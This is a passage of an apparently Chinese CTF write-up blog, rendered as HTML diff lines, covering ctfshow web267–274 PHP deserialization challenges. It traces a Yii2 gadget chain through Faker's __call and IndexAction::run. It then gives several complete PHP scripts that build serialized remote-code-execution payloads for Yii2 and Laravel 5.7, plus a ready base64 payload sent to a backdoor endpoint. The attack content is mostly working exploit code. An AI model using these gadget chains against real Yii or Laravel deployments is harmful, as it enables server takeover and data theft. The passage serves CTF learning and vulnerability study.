class="line">     */</span><br><span class="line">    public function reset()</span><br><span class="line">    &#123;</span><br><span class="line">        if ($this-&gt;_dataReader !== null) &#123;</span><br><span class="line">            $this-&gt;_dataReader-&gt;close();</span><br><span class="line">        &#125;</span><br><span class="line">        $this-&gt;_dataReader = null;</span><br><span class="line">        $this-&gt;_batch = null;</span><br><span class="line">        $this-&gt;_value = null;</span><br><span class="line">        $this-&gt;_key = null;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>正常来说跟进<code>close()</code>方法，但没有找到利用点。但是这里<code>_dataReader</code>是可控的，可以通过触发<code>__call</code>方法来进行利用。</p>
+<p>当一个对象调用不可访问的<code>close</code>方法或者类中没有<code>close</code>方法，即可触发<code>__call</code>。全局搜索一下__call方法，在<code>\vendor\fzaninotto\faker\src\Faker\Generator.php</code>存在合适的方法</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">public function __call($method, $attributes)</span><br><span class="line">   &#123;</span><br><span class="line">       return $this-&gt;format($method, $attributes);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
+
+<p>继续跟进format方法</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">public function format($formatter, $arguments = array())</span><br><span class="line">    &#123;</span><br><span class="line">        return call_user_func_array($this-&gt;getFormatter($formatter), $arguments);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>call_user_func_array</code>：调用回调函数，并把一个数组参数作为回调函数的参数</p>
+<p>使用方法：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">call_user_func_array(callable $callback, array $param_arr): mixed </span><br><span class="line">callback</span><br><span class="line">    被调用的回调函数。</span><br><span class="line">param_arr</span><br><span class="line">    要被传入回调函数的数组，这个数组得是索引数组。</span><br></pre></td></tr></table></figure>
+
+<p>跟进getFormatter</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">public function getFormatter($formatter)</span><br><span class="line">    &#123;</span><br><span class="line">        if (isset($this-&gt;formatters[$formatter])) &#123;</span><br><span class="line">            return $this-&gt;formatters[$formatter];</span><br><span class="line">        &#125;</span><br><span class="line">        foreach ($this-&gt;providers as $provider) &#123;</span><br><span class="line">            if (method_exists($provider, $formatter)) &#123;</span><br><span class="line">                $this-&gt;formatters[$formatter] = array($provider, $formatter);</span><br><span class="line"></span><br><span class="line">                return $this-&gt;formatters[$formatter];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        throw new \InvalidArgumentException(sprintf(&#x27;Unknown formatter &quot;%s&quot;&#x27;, $formatter));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>因为this-&gt;formatters是可控的，因此getFormatter方法的返回值也是我们可控的，因此call_user_func_array(this-&gt;getFormatter(formatter), arguments);中，第一个参数可控，第二个参数为空。</p>
+<p>这一步就需要一个执行类，这时需要类中的方法需要满足两个条件</p>
+<p>方法所需的参数只能是其自己类中存在的（即参数：$this-&gt;args） 方法需要有命令执行功能 查找调用了call_user_func函数的无参方法。</p>
+<p>call_user_func：把第一个参数作为回调函数调用,这里用call_user_func即可达到命令执行的效果也可以达到RCE的效果</p>
+<p>构造正则</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">call_user_func\(\$this-&gt;([a-zA-Z0-9]+), \$this-&gt;([a-zA-Z0-9]+)</span><br></pre></td></tr></table></figure>
+
+<p>其中有两个类中的<code>run</code>方法可用：</p>
+<p><code>yii\rest\CreateAction::run()</code>，<code>$this-&gt;checkAccess, $this-&gt;id</code>两个参数可控</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">public function run()</span><br><span class="line">&#123;</span><br><span class="line">    if ($this-&gt;checkAccess) &#123;</span><br><span class="line">        call_user_func($this-&gt;checkAccess, $this-&gt;id);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ......</span><br><span class="line"></span><br><span class="line">    return $model;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>\yii\rest\IndexAction::run()</code>，<code>$this-&gt;checkAccess, $this-&gt;id</code>两个参数可控</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">public function run()</span><br><span class="line">&#123;</span><br><span class="line">    if ($this-&gt;checkAccess) &#123;</span><br><span class="line">        call_user_func($this-&gt;checkAccess, $this-&gt;id);</span><br><span class="line">    &#125;</span><br><span class="line">    return $this-&gt;prepareDataProvider();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>由此可以构造pop链</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">yii\db\BatchQueryResult::__destruct()-&gt;reset()-&gt;close()</span><br><span class="line">↓↓↓</span><br><span class="line">Faker\Generator::__call()-&gt;format()-&gt;call_user_func_array()</span><br><span class="line">↓↓↓</span><br><span class="line">\yii\rest\IndexAction::run-&gt;call_user_func()</span><br></pre></td></tr></table></figure>
+
+<p>poc1</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">namespace yii\rest&#123;</span><br><span class="line">    class IndexAction&#123;</span><br><span class="line">        public $checkAccess;</span><br><span class="line">        public $id;</span><br><span class="line">        public function __construct()&#123;</span><br><span class="line">            $this-&gt;checkAccess = &#x27;exec&#x27;;  //可执行的函数</span><br><span class="line">            $this-&gt;id = &#x27;cat /flag &gt; 1.txt&#x27;; //命令执行参数</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">namespace Faker &#123;</span><br><span class="line"></span><br><span class="line">    use yii\rest\IndexAction;</span><br><span class="line"></span><br><span class="line">    class Generator</span><br><span class="line">    &#123;</span><br><span class="line">        protected $formatters;</span><br><span class="line"></span><br><span class="line">        public function __construct()</span><br><span class="line">        &#123;</span><br><span class="line">            $this-&gt;formatters[&#x27;close&#x27;] = [new IndexAction(), &#x27;run&#x27;];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">namespace yii\db&#123;</span><br><span class="line"></span><br><span class="line">    use Faker\Generator;</span><br><span class="line"></span><br><span class="line">    class BatchQueryResult&#123;</span><br><span class="line">        private $_dataReader;</span><br><span class="line">        public function __construct()</span><br><span class="line">        &#123;</span><br><span class="line">            $this-&gt;_dataReader=new Generator();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">namespace&#123;</span><br><span class="line"></span><br><span class="line">    use yii\db\BatchQueryResult;</span><br><span class="line"></span><br><span class="line">    echo base64_encode(serialize(new BatchQueryResult()));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>本题实战，要先找到漏洞触发点BatchQueryResult</p>
+<p>首先弱密码<code>admin/admin</code>登录</p>
+<p>在about界面查看源码，有<code>&lt;!--?view-source --&gt;</code>提示</p>
+<p>尝试访问：<code>index.php?r=site%2Fabout&amp;view-source</code>，路由介绍：<a target="_blank" rel="noopener" href="https://www.yiichina.com/doc/guide/2.0/runtime-routing">yii路由</a></p>
+<p>发现一个反序列化入口点：<br><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1747061440491.png"></p>
+<p>poc如下:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">namespace yii\rest&#123;</span><br><span class="line">    class IndexAction&#123;</span><br><span class="line">        public $checkAccess;</span><br><span class="line">        public $id;</span><br><span class="line">        public function __construct()&#123;</span><br><span class="line">            $this-&gt;checkAccess = &#x27;shell_exec&#x27;;</span><br><span class="line">            $this-&gt;id = &#x27;cat /flag &gt; 1.txt&#x27;;                //命令执行</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">namespace Faker &#123;</span><br><span class="line"></span><br><span class="line">    use yii\rest\IndexAction;</span><br><span class="line"></span><br><span class="line">    class Generator</span><br><span class="line">    &#123;</span><br><span class="line">        protected $formatters;</span><br><span class="line"></span><br><span class="line">        public function __construct()</span><br><span class="line">        &#123;</span><br><span class="line">            $this-&gt;formatters[&#x27;close&#x27;] = [new IndexAction(), &#x27;run&#x27;];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">namespace yii\db&#123;</span><br><span class="line"></span><br><span class="line">    use Faker\Generator;</span><br><span class="line"></span><br><span class="line">    class BatchQueryResult&#123;</span><br><span class="line">        private $_dataReader;</span><br><span class="line">        public function __construct()</span><br><span class="line">        &#123;</span><br><span class="line">            $this-&gt;_dataReader=new Generator();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">namespace&#123;</span><br><span class="line"></span><br><span class="line">    use yii\db\BatchQueryResult;</span><br><span class="line"></span><br><span class="line">    echo base64_encode(serialize(new BatchQueryResult()));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>payload为</p>
+<p><code>index.php?r=backdoor/shell&amp;code=TzoyMzoieWlpXGRiXEJhdGNoUXVlcnlSZXN1bHQiOjE6e3M6MzY6IgB5aWlcZGJcQmF0Y2hRdWVyeVJlc3VsdABfZGF0YVJlYWRlciI7TzoxNToiRmFrZXJcR2VuZXJhdG9yIjoxOntzOjEzOiIAKgBmb3JtYXR0ZXJzIjthOjE6e3M6NToiY2xvc2UiO2E6Mjp7aTowO086MjA6InlpaVxyZXN0XEluZGV4QWN0aW9uIjoyOntzOjExOiJjaGVja0FjY2VzcyI7czoxMDoic2hlbGxfZXhlYyI7czoyOiJpZCI7czoxNzoiY2F0IC9mbGFnID4gMS50eHQiO31pOjE7czozOiJydW4iO319fX0=</code></p>
+<p>之后访问1.txt即可<br><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1747061455968.png"></p>
+<h1 id="web268"><a href="#web268" class="headerlink" title="web268"></a>web268</h1><p>换一个poc</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">namespace yii\rest&#123;</span><br><span class="line">    class IndexAction&#123;</span><br><span class="line">        public $checkAccess;</span><br><span class="line">        public $id;</span><br><span class="line">        public function __construct()&#123;</span><br><span class="line">            $this-&gt;checkAccess = &#x27;exec&#x27;;</span><br><span class="line">            $this-&gt;id = &#x27;cat /flags |tee 1.txt&#x27;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">namespace Faker &#123;</span><br><span class="line"></span><br><span class="line">    use yii\rest\IndexAction;</span><br><span class="line"></span><br><span class="line">    class Generator</span><br><span class="line">    &#123;</span><br><span class="line">        protected $formatters;</span><br><span class="line"></span><br><span class="line">        public function __construct()</span><br><span class="line">        &#123;</span><br><span class="line">            $this-&gt;formatters[&#x27;isRunning&#x27;] = [new IndexAction(), &#x27;run&#x27;];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">namespace Codeception\Extension&#123;</span><br><span class="line"></span><br><span class="line">    use Faker\Generator;</span><br><span class="line"></span><br><span class="line">    class RunProcess</span><br><span class="line">    &#123;</span><br><span class="line">        private $processes = [];</span><br><span class="line">        public function __construct()&#123;</span><br><span class="line">            $this-&gt;processes[]=new Generator();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">namespace&#123;</span><br><span class="line"></span><br><span class="line">    use Codeception\Extension\RunProcess;</span><br><span class="line"></span><br><span class="line">    echo base64_encode(serialize(new RunProcess()));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h1 id="web-269-270"><a href="#web-269-270" class="headerlink" title="web 269 270"></a>web 269 270</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">namespace yii\rest &#123;</span><br><span class="line">    class Action</span><br><span class="line">    &#123;</span><br><span class="line">        public $checkAccess;</span><br><span class="line">    &#125;</span><br><span class="line">    class IndexAction</span><br><span class="line">    &#123;</span><br><span class="line">        public function __construct($func, $param)</span><br><span class="line">        &#123;</span><br><span class="line">            $this-&gt;checkAccess = $func;</span><br><span class="line">            $this-&gt;id = $param;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">namespace yii\web &#123;</span><br><span class="line">    abstract class MultiFieldSession</span><br><span class="line">    &#123;</span><br><span class="line">        public $writeCallback;</span><br><span class="line">    &#125;</span><br><span class="line">    class DbSession extends MultiFieldSession</span><br><span class="line">    &#123;</span><br><span class="line">        public function __construct($func, $param)</span><br><span class="line">        &#123;</span><br><span class="line">            $this-&gt;writeCallback = [new \yii\rest\IndexAction($func, $param), &quot;run&quot;];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">namespace yii\db &#123;</span><br><span class="line">    use yii\base\BaseObject;</span><br><span class="line">    class BatchQueryResult</span><br><span class="line">    &#123;</span><br><span class="line">        private $_dataReader;</span><br><span class="line">        public function __construct($func, $param)</span><br><span class="line">        &#123;</span><br><span class="line">            $this-&gt;_dataReader = new \yii\web\DbSession($func, $param);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">namespace &#123;</span><br><span class="line">    $exp = new \yii\db\BatchQueryResult(&#x27;shell_exec&#x27;, &#x27;cp /f* 1.txt&#x27;); //命令执行</span><br><span class="line">    echo(base64_encode(serialize($exp)));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h1 id="web271"><a href="#web271" class="headerlink" title="web271"></a>web271</h1><p>题目<br><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1747061472610.png"></p>
+<p>laravel5.7反序列化漏洞</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">namespace Illuminate\Foundation\Testing&#123;</span><br><span class="line">    class PendingCommand&#123;</span><br><span class="line">        protected $command;</span><br><span class="line">        protected $parameters;</span><br><span class="line">        protected $app;</span><br><span class="line">        public $test;</span><br><span class="line">        public function __construct($command, $parameters,$class,$app)&#123;</span><br><span class="line">            $this-&gt;command = $command;</span><br><span class="line">            $this-&gt;parameters = $parameters;</span><br><span class="line">            $this-&gt;test=$class;</span><br><span class="line">            $this-&gt;app=$app;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">namespace Illuminate\Auth&#123;</span><br><span class="line">    class GenericUser&#123;</span><br><span class="line">        protected $attributes;</span><br><span class="line">        public function __construct(array $attributes)&#123;</span><br><span class="line">            $this-&gt;attributes = $attributes;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">namespace Illuminate\Foundation&#123;</span><br><span class="line">    class Application&#123;</span><br><span class="line">        protected $hasBeenBootstrapped = false;</span><br><span class="line">        protected $bindings;</span><br><span class="line">        public function __construct($bind)&#123;</span><br><span class="line">            $this-&gt;bindings=$bind;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">namespace&#123;</span><br><span class="line">    $genericuser = new Illuminate\Auth\GenericUser(</span><br><span class="line">        array(</span><br><span class="line">            &quot;expectedOutput&quot;=&gt;array(&quot;0&quot;=&gt;&quot;1&quot;),</span><br><span class="line">            &quot;expectedQuestions&quot;=&gt;array(&quot;0&quot;=&gt;&quot;1&quot;)</span><br><span class="line">             )</span><br><span class="line">    );</span><br><span class="line">    $application = new Illuminate\Foundation\Application(</span><br><span class="line">        array(</span><br><span class="line">            &quot;Illuminate\Contracts\Console\Kernel&quot;=&gt;</span><br><span class="line">                array(</span><br><span class="line">                    &quot;concrete&quot;=&gt;&quot;Illuminate\Foundation\Application&quot;</span><br><span class="line">                     )</span><br><span class="line">             )</span><br><span class="line">    );</span><br><span class="line">    $pendingcommand = new Illuminate\Foundation\Testing\PendingCommand(</span><br><span class="line">        &quot;system&quot;,array(&#x27;cat /flag&#x27;),   //命令执行</span><br><span class="line">        $genericuser,</span><br><span class="line">        $application</span><br><span class="line">    );</span><br><span class="line">    echo urlencode(serialize($pendingcommand));</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<h1 id="web272-273"><a href="#web272-273" class="headerlink" title="web272,273"></a>web272,273</h1><p>同样是laravel的漏洞</p>
+<p>有两个payload可用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">//payload1</span><br><span class="line">&lt;?php</span><br><span class="line">namespace Illuminate\Broadcasting&#123;</span><br><span class="line"></span><br><span class="line">    use Illuminate\Bus\Dispatcher;</span><br><span class="line">    use Illuminate\Foundation\Console\QueuedCommand;</span><br><span class="line"></span><br><span class="line">    class PendingBroadcast</span><br><span class="line">    &#123;</span><br><span class="line">        protected $events;</span><br><span class="line">        protected $event;</span><br><span class="line">        public function __construct()&#123;</span><br><span class="line">            $this-&gt;events=new Dispatcher();</span><br><span class="line">            $this-&gt;event=new QueuedCommand();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">namespace Illuminate\Foundation\Console&#123;</span><br><span class="line"></span><br><span class="line">    use Mockery\Generator\MockDefinition;</span><br><span class="line"></span><br><span class="line">    class QueuedCommand</span><br><span class="line">    &#123;</span><br><span class="line">        public $connection;</span><br><span class="line">        public function __construct()&#123;</span><br><span class="line">            $this-&gt;connection=new MockDefinition();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">namespace Illuminate\Bus&#123;</span><br><span class="line"></span><br><span class="line">    use Mockery\Loader\EvalLoader;</span><br><span class="line"></span><br><span class="line">    class Dispatcher</span><br><span class="line">    &#123;</span><br><span class="line">        protected $queueResolver;</span><br><span class="line">        public function __construct()&#123;</span><br><span class="line">            $this-&gt;queueResolver=[new EvalLoader(),&#x27;load&#x27;];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">namespace Mockery\Loader&#123;</span><br><span class="line">    class EvalLoader</span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">namespace Mockery\Generator&#123;</span><br><span class="line">    class MockConfiguration</span><br><span class="line">    &#123;</span><br><span class="line">        protected $name=&quot;feng&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    class MockDefinition</span><br><span class="line">    &#123;</span><br><span class="line">        protected $config;</span><br><span class="line">        protected $code;</span><br><span class="line">        public function __construct()</span><br><span class="line">        &#123;</span><br><span class="line">            $this-&gt;code=&quot;&lt;?php system(&#x27;cat /flag&#x27;);exit()?&gt;&quot;;</span><br><span class="line">            $this-&gt;config=new MockConfiguration();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace&#123;</span><br><span class="line"></span><br><span class="line">    use Illuminate\Broadcasting\PendingBroadcast;</span><br><span class="line"></span><br><span class="line">    echo urlencode(serialize(new PendingBroadcast()));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">//payload2</span><br><span class="line">&lt;?php</span><br><span class="line">namespace Faker&#123;</span><br><span class="line">    class Generator&#123;</span><br><span class="line">        protected $formatters;</span><br><span class="line">        public function __construct()</span><br><span class="line">        &#123;</span><br><span class="line">            $this -&gt; formatters = [&#x27;dispatch&#x27; =&gt; &#x27;system&#x27;];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">namespace Illuminate\Broadcasting&#123;</span><br><span class="line">    use Faker\Generator;</span><br><span class="line">    class PendingBroadcast&#123;</span><br><span class="line">        protected $events;</span><br><span class="line">        protected $event;</span><br><span class="line">        public function __construct()</span><br><span class="line">        &#123;</span><br><span class="line">            $this -&gt; events = new Generator();</span><br><span class="line">            $this -&gt; event = &#x27;cat /flag&#x27;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $a = new PendingBroadcast();</span><br><span class="line">    $res = serialize($a);</span><br><span class="line">    echo urlencode($res);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h1 id="web274"><a href="#web274" class="headerlink" title="web274"></a>web274</h1><p><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1747061492185.png"></p>
+<p>thinkphp5.1的框架，源代码中注释有<code>@unserialize(base64_decode(\$_GET[&#39;data&#39;]))</code></p>
+<p>搜索thinkphp5.1反序列化的漏洞</p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/zpchcbd/p/12642225.html">Thinkphp 5.1.37 反序列化利用链 - zpchcbd - 博客园</a></p>
+<p>__wakeup 一定会调用</p>
